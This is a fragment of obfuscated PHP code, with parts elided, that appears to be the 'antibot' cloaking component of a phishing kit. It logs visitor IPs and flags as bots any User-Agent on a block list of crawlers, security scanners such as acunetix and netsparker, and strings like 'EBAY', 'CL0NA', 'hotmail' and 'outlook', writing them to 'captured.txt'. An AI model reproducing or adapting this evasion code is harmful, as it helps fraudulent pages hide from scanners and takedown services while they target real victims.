...
foreach ($cd1e as $cv1x) {
    if (preg_match('/' . $cv1x . '/', $a370a)) {
        ...
        fwrite($f4c64o, "IP: {$a370a} | ".date('d/m/Y h:i:sa')."\n\n");
        fclose($f4c64o);
        break; 
    }
}
...
$e97476a = array(
    ...
    "jetbrains", "spam", "windows 95", "windows 98", "acunetix",
    "netsparker", "007ac9", "008", "192.comagent", "200pleasebot",
    "360spider", "4seohuntbot", "50.nu", "a6-indexer", "admantx",
    "amznkassocbot", "aboundexbot", "aboutusbot", "abrave spider",
    "accelobot", "acoonbot", "addthis.com", "adsbot-google", "ahrefsbot",
    "alexabot", "amagit.com", "analytics", "antbot", "apercite", 
    "aportworm", "EBAY", "CL0NA", "jabber", "ebay", "arabot", 
    "hotmail!", "msn!", "outlook!", "outlook", "msn", "hotmail"
);

foreach ($e97476a as $d3e7e) {
    if (strpos($c114d, strtolower($d3e7e)) !== false || trim($c114d) === '') {
        $isBot = true;
        $f4c64i = fopen("captured.txt", "a+");
        fwrite($f4c64i, "User-Agent: {$c114d} | IP: {$a370a} | ".date('d/m/Y h:i:sa')."\n\n");
        fclose($f4c64i);
        break; 
    }
}
